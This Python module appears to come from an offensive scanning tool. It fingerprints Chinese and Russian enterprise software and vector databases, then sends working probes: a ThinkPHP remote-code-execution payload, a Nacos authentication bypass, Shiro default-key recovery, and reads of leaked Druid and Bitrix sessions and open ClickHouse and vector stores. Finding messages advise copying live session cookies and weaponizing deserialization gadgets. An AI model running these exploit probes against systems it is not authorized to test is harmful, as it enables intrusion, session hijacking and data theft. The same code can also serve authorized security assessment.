"""Regional technology-stack fingerprinting + unauth exposure/RCE probes.

English-centric tooling barely fingerprints the CN/RU enterprise stacks that carry
the highest-payout pre-auth bugs. This module (a) passively fingerprints a response
for those products, and (b) runs a handful of **deterministic, non-destructive**
active checks — a benign `md5()` echo for ThinkPHP RCE, the Nacos `User-Agent`
auth-bypass differential, the Shiro `rememberMe=deleteMe` tell, and unauth-exposure
reads for Druid / 1C-Bitrix / ClickHouse. Exploitation (gadget chains, shells) is
never sent — that is handed to Strix.

Sources: FreeBuf / Seebug / AnQuanKe (CN), Habr / Wiz (RU/ClickHouse). See
docs/RESEARCH_GAPS.md Theme 4.
"""

from __future__ import annotations

import hashlib
from collections.abc import Callable
from dataclasses import dataclass, field

from ..net.http import HttpClient
from . import bitrix as bitrixmod
from . import shiro as shiromod

# Passive fingerprints over ONE response: (product, where, needle). `where` is
# "body", "cookie" (any Set-Cookie), or "header:<name>".
_SIGNATURES: list[tuple[str, str, str]] = [
    ("1C-Bitrix", "body", "/bitrix/js/"),
    ("1C-Bitrix", "body", "bitrix_sessid"),
    ("1C-Bitrix", "cookie", "bitrix_sm_"),
    ("ThinkPHP", "body", "thinkphp"),
    ("ThinkPHP", "header:x-powered-by", "thinkphp"),
    ("Apache Shiro", "cookie", "rememberme"),
    ("Nacos", "body", "nacos"),
    ("Alibaba Druid", "body", "druid stat index"),
    ("Weaver e-cology", "cookie", "ecology_jsessionid"),
    ("Seeyon OA", "body", "/seeyon/"),
    ("Yonyou NC", "body", "yonyou"),
    ("ClickHouse", "body", "clickhouse"),
    ("Shiro/Spring", "header:server", "shiro"),
    ("ChromaDB", "body", "chroma"),
    ("Weaviate", "body", "weaviate"),
    ("Qdrant", "body", "qdrant"),
]


@dataclass
class StackResult:
    url: str
    detected: list[str] = field(default_factory=list)
    findings: list[dict] = field(default_factory=list)
    error: str | None = None


def match_stack_signatures(*, body: str, headers: dict[str, str],
                           set_cookies: list[str]) -> list[str]:
    """Passive fingerprint: which regional products does this response indicate?"""

    low_body = (body or "").lower()
    low_hdr = {k.lower(): (v or "").lower() for k, v in headers.items()}
    cookies = " ".join(set_cookies).lower()
    found: list[str] = []
    for product, where, needle in _SIGNATURES:
        hit = False
        if where == "body":
            hit = needle in low_body
        elif where == "cookie":
            hit = needle in cookies
        elif where.startswith("header:"):
            hit = needle in low_hdr.get(where.split(":", 1)[1], "")
        if hit and product not in found:
            found.append(product)
    return found


async def _fetch(client, url, scope_check, **kw):
    return await client.fetch(url, timeout=12.0, follow_redirects=True,
                              scope_check=scope_check, **kw)


async def _probe_thinkphp(client, base, scope_check) -> dict | None:
    marker = "moonmcp"
    expected = hashlib.md5(marker.encode()).hexdigest()  # noqa: S324 - benign RCE proof, not crypto
    payload = ("/index.php?s=/index/\\think\\app/invokefunction"
               f"&function=call_user_func_array&vars[0]=md5&vars[1][]={marker}")
    r = await _fetch(client, base.rstrip("/") + payload, scope_check)
    if r.status is not None and expected in r.text(limit=20_000):
        return {"product": "ThinkPHP", "severity": "critical", "verdict": "confirmed",
                "issue": "ThinkPHP invokefunction RCE",
                "detail": f"benign md5('{marker}') evaluated server-side → {expected} (CVE-2018-20062)"}
    return None


async def _probe_nacos(client, base, scope_check) -> dict | None:
    path = "/nacos/v1/auth/users?pageNo=1&pageSize=1"
    normal = await _fetch(client, base.rstrip("/") + path, scope_check)
    bypass = await _fetch(client, base.rstrip("/") + path, scope_check,
                          headers={"User-Agent": "Nacos-Server"})
    if bypass.status == 200 and normal.status in (401, 403):
        body = bypass.text(limit=20_000)
        if "pageItems" in body or '"username"' in body:
            return {"product": "Nacos", "severity": "high", "verdict": "confirmed",
                    "issue": "Nacos auth bypass (User-Agent: Nacos-Server)",
                    "detail": "user list returned to the Nacos-Server UA but 401/403 without it "
                              "(CVE-2021-29441)"}
    return None


async def _probe_shiro(client, base, scope_check) -> dict | None:
    root = base.rstrip("/") + "/"
    r = await _fetch(client, root, scope_check, headers={"Cookie": "rememberMe=1"})
    setc = " ".join(r.get_all("set-cookie")).lower()
    if not ("remembeme=deleteme" in setc or "rememberme=deleteme" in setc):
        return None
    # Shiro present and the rememberMe=deleteMe tell fires for a bad cookie → run the SAFE
    # default-key oracle (a benign SimplePrincipalCollection encrypted under each default AES
    # key; the key whose cookie is NOT rejected is the one in use). No gadget is ever sent.
    async def _deletes(cookie: str) -> bool:
        rr = await _fetch(client, root, scope_check, headers={"Cookie": f"rememberMe={cookie}"})
        return "rememberme=deleteme" in " ".join(rr.get_all("set-cookie")).lower()

    key = await shiromod.recover_key(_deletes)
    if key:
        return {"product": "Apache Shiro", "severity": "high", "verdict": "confirmed",
                "issue": "Shiro-550 default rememberMe key recovered",
                "detail": f"a benign SimplePrincipalCollection encrypted with the default AES key "
                          f"'{key}' decrypted cleanly (no rememberMe=deleteMe) — CVE-2016-4437 "
                          "deserialization RCE with a known key. Weaponize the gadget chain via Strix",
                "recovered_key": key}
    return {"product": "Apache Shiro", "severity": "medium", "verdict": "fingerprint",
            "issue": "Apache Shiro rememberMe present",
            "detail": "response set rememberMe=deleteMe → Shiro, but no key in the default list "
                      "matched (custom key) — try a wider key list / Strix"}


async def _probe_druid(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/druid/index.html", scope_check)
    body = r.text(limit=20_000).lower() if r.status == 200 else ""
    if not ("druid stat index" in body or "druid-min.js" in body):
        return None
    # Upgrade: /druid/websession.json leaks LIVE session objects (SESSIONID, principal),
    # so an attacker copies the freshest cookie → authenticated backend access.
    ws = await _fetch(client, base.rstrip("/") + "/druid/websession.json", scope_check)
    ws_body = ws.text(limit=20_000) if ws.status == 200 else ""
    if ws.status == 200 and "SESSIONID" in ws_body and ("Principal" in ws_body or "LastAccessTime" in ws_body):
        return {"product": "Alibaba Druid", "severity": "high", "verdict": "confirmed",
                "issue": "Druid monitor session leak (websession.json)",
                "detail": "/druid/websession.json leaked live sessions (SESSIONID + principal) — copy the "
                          "freshest SESSIONID cookie for authenticated backend access; /druid/sql.json "
                          "also leaks server SQL. Replay the cookie via Strix"}
    return {"product": "Alibaba Druid", "severity": "medium", "verdict": "confirmed",
            "issue": "Druid monitor exposed unauthenticated",
            "detail": "/druid/index.html reachable — check /druid/websession.json (live sessions) and "
                      "/druid/sql.json (server SQL)"}


async def _probe_bitrix(client, base, scope_check) -> dict | None:
    root = base.rstrip("/")
    r = await _fetch(client, root + "/bitrix/admin/index.php", scope_check)
    body = r.text(limit=20_000).lower() if r.status == 200 else ""
    admin = r.status == 200 and ("bitrix" in body or "авторизац" in body)
    # composite_data.php leaking bitrix_sessid unauthenticated is the prerequisite for the
    # html_editor_action.php SSRF (and CSRF-token abuse) — a stronger lead than a reachable panel.
    cd = await _fetch(client, root + bitrixmod.COMPOSITE_DATA_PATH, scope_check)
    sessid = bitrixmod.extract_sessid(cd.text(limit=80_000)) if cd.status == 200 else None
    if sessid:
        return {"product": "1C-Bitrix", "severity": "medium", "verdict": "exposed",
                "issue": "Bitrix unauth session token leaked (composite_data.php)",
                "detail": "composite_data.php leaks bitrix_sessid unauthenticated — the prerequisite for "
                          "the html_editor_action.php SSRF. Confirm the SSRF with bitrix_ssrf_probe (OAST); "
                          "vote-module CVE-2022-27228 via Strix"}
    if admin:
        return {"product": "1C-Bitrix", "severity": "low", "verdict": "exposed",
                "issue": "Bitrix admin panel reachable",
                "detail": "/bitrix/admin/ returned 200 — confirm the html_editor_action.php SSRF with "
                          "bitrix_ssrf_probe; enumerate module CVEs (vote-module CVE-2022-27228) via Strix"}
    return None


async def _probe_clickhouse(client, base, scope_check) -> dict | None:
    # Only meaningful when the target points at the ClickHouse HTTP port (8123).
    r = await _fetch(client, base.rstrip("/") + "/?query=SELECT%201", scope_check)
    if r.status == 200 and r.text(limit=200).strip() == "1":
        return {"product": "ClickHouse", "severity": "critical", "verdict": "confirmed",
                "issue": "unauthenticated ClickHouse HTTP interface",
                "detail": "SELECT 1 executed with no auth — full DB read via /play (cf. the Wiz "
                          "DeepSeek leak)"}
    return None


async def _probe_chroma(client, base, scope_check) -> dict | None:
    # Standalone vector store: unauth heartbeat, and ALL versions since 1.0.0 are
    # pre-auth RCE via ChromaToast (CVE-2026-45829, CVSS 10, unpatched at disclosure).
    r = await _fetch(client, base.rstrip("/") + "/api/v2/heartbeat", scope_check)
    if r.status == 200 and "nanosecond heartbeat" in r.text(limit=2000).lower():
        vr = await _fetch(client, base.rstrip("/") + "/api/v2/version", scope_check)
        ver = vr.text(limit=200).strip().strip('"') if vr.status == 200 else "?"
        return {"product": "ChromaDB", "severity": "critical", "verdict": "confirmed",
                "issue": "unauthenticated ChromaDB vector store",
                "detail": f"/api/v2/heartbeat answered with no auth (version {ver}) — every version since "
                          "1.0.0 is pre-auth RCE via ChromaToast (CVE-2026-45829, CVSS 10, unpatched); "
                          "hand the model-load PoC to Strix, never in-scan"}
    return None


async def _probe_weaviate(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/v1/meta", scope_check)
    low = r.text(limit=5000).lower() if r.status == 200 else ""
    if r.status == 200 and '"hostname"' in low and ('"version"' in low or '"modules"' in low):
        return {"product": "Weaviate", "severity": "high", "verdict": "exposed",
                "issue": "unauthenticated Weaviate vector store",
                "detail": "/v1/meta readable with no auth — objects and their (invertible) embeddings are "
                          "exposed; the GraphQL Get{} API is readable too. Bulk read → Strix"}
    return None


async def _probe_qdrant(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/collections", scope_check)
    low = r.text(limit=5000).lower() if r.status == 200 else ""
    if r.status == 200 and '"result"' in low and '"collections"' in low and '"status"' in low:
        return {"product": "Qdrant", "severity": "high", "verdict": "exposed",
                "issue": "unauthenticated Qdrant vector store",
                "detail": "/collections listed with no API key — vectors and their payloads are exposed. "
                          "Bulk read → Strix"}
    return None


_ACTIVE_PROBES = (_probe_thinkphp, _probe_nacos, _probe_shiro, _probe_druid,
                  _probe_bitrix, _probe_clickhouse,
                  _probe_chroma, _probe_weaviate, _probe_qdrant)


async def probe_stack(client: HttpClient, base_url: str, *,
                      scope_check: Callable[[str], bool] | None = None) -> StackResult:
    """Fingerprint the base page, then run the deterministic unauth stack probes."""

    result = StackResult(url=base_url)
    home = await _fetch(client, base_url, scope_check)
    if home.status is not None:
        result.detected = match_stack_signatures(
            body=home.text(limit=100_000), headers=home.headers_map(),
            set_cookies=home.get_all("set-cookie"))
    for probe in _ACTIVE_PROBES:
        try:
            hit = await probe(client, base_url, scope_check)
        except Exception:  # one probe must never sink the sweep
            hit = None
        if hit is not None:
            result.findings.append(hit)
            if hit["product"] not in result.detected:
                result.detected.append(hit["product"])
    return result
